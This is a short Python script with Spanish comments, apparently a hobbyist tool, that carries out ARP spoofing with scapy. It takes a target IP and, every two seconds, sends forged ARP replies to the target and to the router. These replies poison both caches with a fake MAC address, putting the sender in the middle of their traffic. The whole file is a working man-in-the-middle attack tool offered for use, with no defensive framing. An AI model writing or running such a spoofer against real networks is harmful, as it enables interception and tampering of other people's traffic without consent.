#para el uso cambia la direccion MAC de su linux a "aa:bb:cc:44:55:66" o indicar en hwsrc su direccion MAC


import argparse
import scapy.all as scapy
import time
from termcolor import colored
import sys
import signal
def def_handler(sig,frame):
    print(colored("\n[!] Saliendo... ", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)
def getArguments():
    parser = argparse.ArgumentParser(description="ARP SPOOFER")
    parser.add_argument("-t","--target",required=True,dest="ip_address",help="HOST / IP Range To Spoof")

    return parser.parse_args()


def spoof(ip_address,spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address,hwsrc="aa:bb:cc:44:55:66") # al valor ser 2 estamos enviando una respuesta
    scapy.send(arp_packet,verbose=False)


def main():
    arguments = getArguments()
    while True:
        spoof(arguments.ip_address,"")  #enteer the ip of your router
        spoof("",arguments.ip_address)#enter the router ip
        print("\n[+] Sending")

        time.sleep(2)
if __name__ == "__main__":
    main()

